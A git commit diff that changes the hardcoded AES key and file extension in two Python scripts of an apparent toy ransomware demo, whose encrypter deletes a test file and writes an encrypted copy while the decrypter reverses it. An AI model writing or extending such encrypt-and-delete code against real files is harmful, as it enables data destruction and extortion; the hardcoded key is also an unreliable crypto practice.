5dda278a389f1738a88016089a751f5d093bd635
Percio Andrade <perciocastelo@gmail.com>
2024-12-23 21:52:27 -0400

    up

--- decrypter.py
+++ decrypter.py
@@ -2,13 +2,13 @@ import os
 import pyaes
 
 ## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
+file_name = "teste.txt.rauquerm4st3rhue"
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
 ## chave para descriptografia
-key = b"testeransomwares"
+key = b"chavedificilcara"
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
--- encrypter.py
+++ encrypter.py
@@ -11,14 +11,14 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"chavedificilcara"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_name + ".rauquerm4st3rhue"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
